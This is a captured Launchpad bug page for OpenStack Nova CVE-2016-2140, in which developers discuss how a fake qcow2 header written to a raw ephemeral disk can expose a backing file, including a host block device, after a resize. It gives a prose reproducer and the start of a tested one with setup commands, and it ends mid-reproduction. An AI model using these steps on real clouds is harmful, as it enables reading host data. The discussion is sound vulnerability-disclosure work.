      <div class="importance-content" style="width: 100%; float: left">
        <span style="float: left" class="value importanceCRITICAL">Critical</span>
      </div>
    </td>

    <td style="width:20%; margin: 0; padding: 0;
               vertical-align: middle; padding-left: 0.5em">
      

      
        <span id="assignee-picker-tasksummary2004890">
          <span class="yui3-activator-data-box">
            
            
              Unassigned
            
          </span>
          
          <button class="lazr-btn yui3-activator-act yui3-activator-hidden">
            Edit
          </button>
          <div class="yui3-activator-message-box yui3-activator-hidden"></div>
        </span>
      
    </td>

    <td style="width: 20%; vertical-align: middle">
      
    </td>

    
  </tr>

  
    <tr class="bugtask-collapsible-content hidden" id="task2004890">
     <td colspan="7"><form action="/ossa/+bug/1548450/+editstatus" method="post" enctype="multipart/form-data">
  

  <p class="error message">
    You need to log in to change this bug's status.
  </p>
  
  <table class="summary" style="float: right; margin-left: 1em;">
    <tr>
      <th>Affecting:</th>
      <td><a href="/ossa">OpenStack Security Advisory</a></td>
    </tr>
    <tr>
      <th>Filed here by:</th>
      <td><a href="https://launchpad.net/~tristan-cacqueray" class="sprite person">Tristan Cacqueray</a></td>
    </tr>
    <tr>
      <th>When:</th>
      <td>
        <time title="2016-02-22 19:15:30 UTC" datetime="2016-02-22T19:15:30.181992+00:00">2016-02-22</time>
      </td>
    </tr>
    <tr>
      <th>Confirmed:</th>
      <td>
        <time title="2016-02-23 19:57:53 UTC" datetime="2016-02-23T19:57:53.323488+00:00">2016-02-23</time>
      </td>
    </tr>
    
    <tr>
      <th>Started work:</th>
      <td>
        <time title="2016-03-01 16:06:09 UTC" datetime="2016-03-01T16:06:09.964361+00:00">2016-03-01</time>
      </td>
    </tr>
    <tr>
      <th>Completed:</th>
      <td>
        <time title="2016-03-14 15:06:23 UTC" datetime="2016-03-14T15:06:23.665452+00:00">2016-03-14</time>
      </td>
    </tr>
  </table>
  <div class="field">
    <table>
      <tr>
        <td>
          <label for="ossa.target">Target</label>
        </td>
      </tr>
      <tr>
        <td>
          <table>
  <tr>
    <td>
      <label>
        <input class="radioType" id="ossa.target.option.package" name="ossa.target" type="radio" value="package" />
        Distribution
      </label>
    </td>
    <td>
      <select id="ossa.target.distribution" name="ossa.target.distribution" size="1" >
<option value="baltix">Baltix</option>
<option value="boss">BOSS</option>
<option value="charms">Juju Charms Collection</option>
<option value="elbuntu">Elbuntu</option>
<option value="guadalinex">Guadalinex</option>
<option value="guadalinexedu">Guadalinex Edu</option>
<option value="kiwilinux">Kiwi Linux</option>
<option value="nubuntu">nUbuntu</option>
<option value="pld-linux">PLD Linux</option>
<option value="tilix">Tilix</option>
<option value="tuxlab">tuXlab</option>
<option selected="selected" value="ubuntu">Ubuntu</option>
<option value="ubuntu-leb">Ubuntu Linaro Evaluation Build</option>
<option value="ubuntu-rtm">Ubuntu RTM</option>
</select>
<input name="ossa.target.distribution-empty-marker" type="hidden" value="1" />
    </td>
  </tr>
  <tr>
    <td align="right">
      <label for="ossa.target.option.package">
        Package
      </label>
    </td>
    <td>
      


    <input type="text" value="" id="ossa.target.package"
                         name="ossa.target.package" size="20"
                         maxlength=""
                         onKeyPress="selectWidget(&#x27;ossa.target.option.package&#x27;, event)" style=""
                         class="" />

    
      
      <script type="text/javascript">
          LPJS.use('node', 'lp.app.picker', function(Y) {
              var text_input = Y.DOM.byId('ossa.target.package');
              var select_menu = Y.DOM.byId('ossa.target.package-suggestions');
              Y.lp.app.picker.connect_select_menu(
                  select_menu, text_input);
          });</script>
    

    <span class="hidden">(<a id="show-widget-ossa-target-package" href="#">Find&hellip;</a>)</span>
    <script>
    LPJS.use('node', 'lp.app.picker', function(Y) {
        var config = {"remove_person_text": "Remove person", "picker_type": "default", "extra_no_results_message": null, "header": "Select a package", "vocabulary_filters": [], "input_element": "ossa.target.package", "show_remove_button": false, "show_assign_me_button": false, "step_title": "Search by name", "show_widget_id": "show-widget-ossa-target-package", "selected_value": null, "selected_value_metadata": null, "remove_team_text": "Remove team", "assign_me_text": "Pick me", "show_create_team": false, "vocabulary_name": "DistributionPackage"};
        var show_widget_id = 'show-widget-ossa-target-package';
        Y.lp.app.picker.addPicker(config, show_widget_id);
    });
    </script>
  



    </td>
  </tr>

  <tr>
    <td>
      <label>
        <input class="radioType" checked="checked" id="ossa.target.option.product" name="ossa.target" type="radio" value="product" />
       Project
      </label>
    </td>
    <td>
      


    <input type="text" value="ossa" id="ossa.target.product"
                         name="ossa.target.product" size="20"
                         maxlength=""
                         onKeyPress="selectWidget(&#x27;ossa.target.option.product&#x27;, event)" style=""
                         class="" />

    
      
      <script type="text/javascript">
          LPJS.use('node', 'lp.app.picker', function(Y) {
              var text_input = Y.DOM.byId('ossa.target.product');
              var select_menu = Y.DOM.byId('ossa.target.product-suggestions');
              Y.lp.app.picker.connect_select_menu(
                  select_menu, text_input);
          });</script>
    

    <span class="hidden">(<a id="show-widget-ossa-target-product" href="#">Find&hellip;</a>)</span>
    <script>
    LPJS.use('node', 'lp.app.picker', function(Y) {
        var config = {"remove_person_text": "Remove person", "picker_type": "default", "extra_no_results_message": null, "header": "Select a project", "vocabulary_filters": [], "input_element": "ossa.target.product", "show_remove_button": false, "show_assign_me_button": false, "step_title": "Search", "show_widget_id": "show-widget-ossa-target-product", "selected_value": "ossa", "selected_value_metadata": null, "remove_team_text": "Remove team", "assign_me_text": "Pick me", "show_create_team": false, "vocabulary_name": "Product"};
        var show_widget_id = 'show-widget-ossa-target-product';
        Y.lp.app.picker.addPicker(config, show_widget_id);
    });
    </script>
  



    </td>
  </tr>
</table>

          
        </td>
      </tr>
    </table>
    
    <table>
      <tr>
        <td>
          <label style="font-weight: bold" for="ossa.status">Status</label>
        </td>
        <td>
          <label style="font-weight: bold" for="ossa.importance">Importance</label>
        </td>
        
      </tr>
      <tr>
        <td><div>
<div class="value">
<select id="ossa.status" name="ossa.status" size="1" >
<option selected="selected" value="Fix Released">Fix Released</option>
</select>
</div>
<input name="ossa.status-empty-marker" type="hidden" value="1" />
</div></td>
        <td title="Changeable only by a project maintainer or bug supervisor">
          <span class="sprite read-only"></span>
          <span class="importanceCRITICAL">Critical</span>
        </td>
        
      </tr>
    </table>
    <table>
      <tr>
        <td>
          <label style="font-weight: bold" for="ossa.assignee">Assigned to</label>
        </td>
      </tr>
      <tr>
        <td colspan="2" style="white-space: nowrap">

  <table>
    <tr>
      <td style="padding: 0 2px 2px 0">
        <input type="radio" checked="checked" id="ossa.assignee.assign_to_nobody" name="ossa.assignee.option" value="ossa.assignee.assign_to_nobody" />
      </td>
      <td style="padding: 0">
        <label style="font-weight: normal" for="ossa.assignee.assign_to_nobody">
          Nobody
        </label>
      </td>
    </tr>
    <tr>
      <td style="padding: 0 2px 2px 0">
        <input type="radio" id="ossa.assignee.assign_to_me" name="ossa.assignee.option" value="ossa.assignee.assign_to_me" />
      </td>
      <td style="padding: 0">
        <label style="font-weight: normal" for="ossa.assignee.assign_to_me">
          Me
        </label>
      </td>
    </tr>
    
    
  </table>


</td>
      </tr>
    </table>
    
  </div>
  <div class="field">
    <div>
      <label style="font-weight: bold" for="ossa.comment_on_change">Comment on this change (optional)</label>
      <textarea cols="62" rows="4" id="ossa.comment_on_change" name="ossa.comment_on_change"></textarea>
    </div>
    <div>
      <label style="font-weight: normal">
        <input type="checkbox" name="subscribe" id="subscribe" value="Subscribe" />
        Email me about changes to this bug report
      </label>
    </div>
  </div>
  
</form>
</td>
    </tr>
  


        
      </tbody>

    </table>



<div class="actions">
  
    <span id="also-affects-product" class="">
    <a class="menu-link-addupstream sprite add" href="https://bugs.launchpad.net/nova/+bug/1548450/+choose-affected-product">Also affects project</a>
        <a href="/+help-bugs/also-affects-project-help.html" target="help" class="sprite maybe action-icon">(?)</a>
    </span>
    <span id="also-affects-package" class="">
    <a class="menu-link-adddistro sprite add" href="https://bugs.launchpad.net/nova/+bug/1548450/+distrotask">Also affects distribution/package</a>
    </span>
    <a class="menu-link-nominate sprite milestone" href="https://bugs.launchpad.net/nova/+bug/1548450/+nominate">Nominate for series</a>
    
  

</div>




      <div id="maincontentsub">
        <div class="top-portlet">

      <div itemprop="mainContentOfPage" class="report">
        

        <div>
  <div class="lazr-multiline-edit" id="edit-description">
  <div class="clearfix">
    

    <h3>Bug Description</h3>
  </div>

  <div class="yui3-editable_text-text"><p>First, a caveat. This report is from code inspection only. I haven&#x27;t attempted to replicate it, and I have no immediate plans to. It&#x27;s possible it doesn&#x27;t exist due to an interaction which isn&#x27;t immediately obvious.</p>
<p>When resizing an instance using the libvirt driver, we run LibvirtDriver.<wbr />migrate_<wbr />disk_and_<wbr />power_off on the source host. If there is no shared storage, data is copied. Specifically, there&#x27;s a loop in that function which loops over disk info:</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for info in disk_info:<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# assume inst_base == dirname(<wbr />info[&#x27;path&#x27;<wbr />])<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;...<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;copy the disk</p>
<p>Note that this doesn&#x27;t copy disk.info, because it&#x27;s not a disk. I have actually confirmed this whilst investigating another bug.</p>
<p>The problem with this is that disk.info contains file format information, which means that when the instance starts up again, the format of all its disks are re-inspected. This is the bug. It means that a malicious user can write data to an ephemeral or root disk which fakes a qcow2 header, and on re-inspection it will be detected as qcow2 and data from a user-specified backing file will be served.</p>
<p>I am moderately confident that this is a real bug.</p>
<p>Unlike the previous file format bug I reported, though, this bug would be mitigated by the fact that the user would have to access the disk via libvirt/qemu. Assuming they haven&#x27;t disabled SELinux (nobody does that, right?) this severely limits the data which can be accessed, possibly to the point that it isn&#x27;t worth exploiting. I also believe it would only be exploitable on deployments using raw storage, which I believe isn&#x27;t common.</p>
<p>Given that I don&#x27;t think it&#x27;s all that serious in practise, I&#x27;m not going to work on this immediately as I don&#x27;t have the time. If it&#x27;s still around when I&#x27;m less busy I&#x27;ll pick it up.</p></div>
  </div>

  
</div>


        <div style="margin:-10px 0 20px 5px" class="clearfix">
          <span>See <a href="comments/0">original description</a></span>
        </div>

        <div id="bug-tags">
          <span id="tags-heading">
            Tags:
          </span>
          <span id="tag-list">
            <a class="official-tag" href="/nova/+bugs?field.tag=in-stable-liberty">in-stable-liberty</a>
            <a class="unofficial-tag" href="/nova/+bugs?field.tag=in-stable-kilo">in-stable-kilo</a>
          </span>
          
          <a href="+edit" title="Edit tags" id="tags-trigger" class="sprite edit action-icon">Edit</a>
          <a href="/+help-bugs/tag-help.html" target="help" class="sprite maybe action-icon">Tag help</a>
        </div>

        <script type="text/javascript">
          LPJS.use('event', 'node', 'lp.bugs.tags_entry', function(Y) {
              Y.on('domready',
                   function(e) {
                       Y.lp.bugs.tags_entry.setup_tag_entry(
                           available_official_tags);
                   },
                   window);
          });
        </script>

        <div class="clearfix"></div>
      </div>

      <div id="branches-and-cves">
        <div id="bug-branches-container" style="float: left">
          
        </div><!-- bug-branch-container -->

        <div class="cves">
          <h2>CVE References</h2>
          <ul>
            <li class="sprite cve">
              <a href="/bugs/cve/2016-2140" title="The libvirt driver in OpenStack Compu...">2016-2140</a>
            </li>
          </ul>
        </div>

        <div class="clearfix"></div>
      </div> <!-- branches and CVEs -->

      </div>

      <div>
      
        
          

          
              <div class="boardComment">
  <div class="boardCommentDetails">
    
      <a href="https://launchpad.net/~tristan-cacqueray" class="sprite person">Tristan Cacqueray (tristan-cacqueray)</a>
    
    <time title="2016-02-22 19:15:57 UTC" datetime="2016-02-22T19:15:57.549968+00:00">on 2016-02-22</time>
  </div>
  <div class="boardCommentActivity">
    <table class="bug-activity">
  
    
      
    
    <tr>
      <td style="text-align: right;">
        <b>description</b>:
      </td>
      <td>
        updated
      </td>
    </tr>
  
  
    
      <tr>
        <td colspan="2">Changed in ossa: </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        New &#8594; Incomplete
      </td>
    </tr>
  
</table>
  </div>
</div>
          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/1" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~tristan-cacqueray" class="sprite person">Tristan Cacqueray (tristan-cacqueray)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-02-22T19:23:40.799490+00:00" title="2016-02-22 19:23:40 UTC">on 2016-02-22</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/1"> #1</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Since this report concerns a possible security risk, an incomplete security advisory task has been added while the core security reviewers for the affected project or projects confirm the bug and discuss the scope of any vulnerability along with potential solutions.</p>
<p>So IIRC, the user needs direct access to libvirt/qemu to overwrite the disk with fake qcow2 headers after the instance is migrated and before the disk is re-inspected ?</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Since this report concerns a possible security risk, an incomplete security advisory task has been added while the core security reviewers for the affected project or projects confirm the bug and discuss the scope of any vulnerability along with potential solutions.

So IIRC, the user needs direct access to libvirt/qemu to overwrite the disk with fake qcow2 headers after the instance is migrated and before the disk is re-inspected ?</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/2" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~mbooth-9" class="sprite person">Matthew Booth (mbooth-9)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-02-23T10:07:51.113614+00:00" title="2016-02-23 10:07:51 UTC">on 2016-02-23</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/2"> #2</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Here&#x27;s a theoretical reproducer, which *I HAVE NOT TESTED*:</p>
<p>A system uses raw files for storage. An unprivileged user creates an instance using a flavour with an ephemeral disk. From within the instance, the user writes a fake qcow2 header to the ephemeral disk with an external backing file. The user resizes the instance. After resize, the user logs in to their instance again. The ephemeral disk now presents the contents of the backing file rather than the fake qcow2 header.</p>
<p>There is a hard requirement here on using the libvirt driver and raw storage. Qcow2 storage isn&#x27;t vulnerable to this kind of attack, and rbd and lvm both hard code the raw format and don&#x27;t require inspection. Ploop is just different. I doubt it&#x27;s vulnerable.</p>
<p>Because the data is accessed from within the instance, it is confined both by unix permissions, and by whatever mechanism confines data accessible by the qemu process. On RHEL OSP this would include SELinux, which I believe would severely limit the impact of this attack.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Here's a theoretical reproducer, which *I HAVE NOT TESTED*:

A system uses raw files for storage. An unprivileged user creates an instance using a flavour with an ephemeral disk. From within the instance, the user writes a fake qcow2 header to the ephemeral disk with an external backing file. The user resizes the instance. After resize, the user logs in to their instance again. The ephemeral disk now presents the contents of the backing file rather than the fake qcow2 header.

There is a hard requirement here on using the libvirt driver and raw storage. Qcow2 storage isn't vulnerable to this kind of attack, and rbd and lvm both hard code the raw format and don't require inspection. Ploop is just different. I doubt it's vulnerable.

Because the data is accessed from within the instance, it is confined both by unix permissions, and by whatever mechanism confines data accessible by the qemu process. On RHEL OSP this would include SELinux, which I believe would severely limit the impact of this attack.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/3" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~berrange" class="sprite person">Daniel Berrange (berrange)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-02-23T10:36:34.666757+00:00" title="2016-02-23 10:36:34 UTC">on 2016-02-23</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/3"> #3</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Whether SELinux protects us or not entirely depends on what Nova sets as the disk format in the XML after the resize. If Nova were to tell Libvirt that the disk is qcow2 after the resize, then SELinux will happily grant access to the backing file set in the qcow2 file.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Whether SELinux protects us or not entirely depends on what Nova sets as the disk format in the XML after the resize. If Nova were to tell Libvirt that the disk is qcow2 after the resize, then SELinux will happily grant access to the backing file set in the qcow2 file.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/4" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~mbooth-9" class="sprite person">Matthew Booth (mbooth-9)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-02-23T10:44:17.397964+00:00" title="2016-02-23 10:44:17 UTC">on 2016-02-23</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/4"> #4</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Ah, that would be more serious, then. I can confirm that nova explicitly tells libvirt that the file is qcows.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Ah, that would be more serious, then. I can confirm that nova explicitly tells libvirt that the file is qcows.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/5" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~mbooth-9" class="sprite person">Matthew Booth (mbooth-9)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-02-23T10:48:21.013472+00:00" title="2016-02-23 10:48:21 UTC">on 2016-02-23</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/5"> #5</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>To clarify that last: I can confirm that nova would tell libvirt that the file is qcow2 if my understanding of the bug is correct. I still haven&#x27;t reproduced it.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">To clarify that last: I can confirm that nova would tell libvirt that the file is qcow2 if my understanding of the bug is correct. I still haven't reproduced it.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/6" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~mbooth-9" class="sprite person">Matthew Booth (mbooth-9)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-02-23T12:00:18.801964+00:00" title="2016-02-23 12:00:18 UTC">on 2016-02-23</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/6"> #6</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>If this is exploitable, it would be interesting to know if libvirt will allow use of a host block device as a backing file. That would be extremely serious.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">If this is exploitable, it would be interesting to know if libvirt will allow use of a host block device as a backing file. That would be extremely serious.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/7" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~lyarwood" class="sprite person">Lee Yarwood (lyarwood)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-02-23T19:37:52.033347+00:00" title="2016-02-23 19:37:52 UTC">on 2016-02-23</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/7"> #7</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  <a href="https://bugs.launchpad.net/nova/+bug/1548450/comments/7/+download">Download full text</a> (6.7 KiB)
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>I&#x27;ve been able to reproduce this using a compute host block device as the backing file on RHEL OSP 8 (Liberty). I plan on repeating this with devstack for Mitaka shortly. My notes on this reproducer are below :</p>
<p>- Image and flavor configuration :</p>
<p># wget <a rel="nofollow" href="https://download.fedoraproject.org/pub/fedora/linux/releases/23/Cloud/x86_64/Images/Fedora-Cloud-Base-23-20151030.x86_64.qcow2">https:/<wbr />/download.<wbr />fedoraproject.<wbr />org/pub/<wbr />fedora/<wbr />linux/releases/<wbr />23/Cloud/<wbr />x86_64/<wbr />Images/<wbr />Fedora-<wbr />Cloud-Base-<wbr />23-20151030.<wbr />x86_64.<wbr />qcow2</a><br />
# glance image-create --name fedora --file Fedora-<wbr />Cloud-Base-<wbr />23-20151030.<wbr />x86_64.<wbr />qcow2 --disk-format qcow2 --container-format bare --progress<br />
# nova flavor-create eph 6 512 5 1 --ephemeral 1<br />
# nova flavor-create eph_large 7 768 5 1 --ephemeral 1</p>
<p>- Ensure use_cow_images is False on all compute hosts :</p>
<p># openstack-config --get /etc/nova/nova.conf libvirt use_cow_images<br />
False</p>
<p>- Boot an instance using the fedora image and a small ephemeral disk :</p>
<p># nova boot --key-name local --image fedora --ephemeral size=1,format=ext4 --flavor 6 --nic net-id=<wbr />b41000f6-<wbr />9de2-4851-<wbr />a622-2a5786167e<wbr />83 test-boot</p>
<p>root@host # ps aux | grep qemu<br />
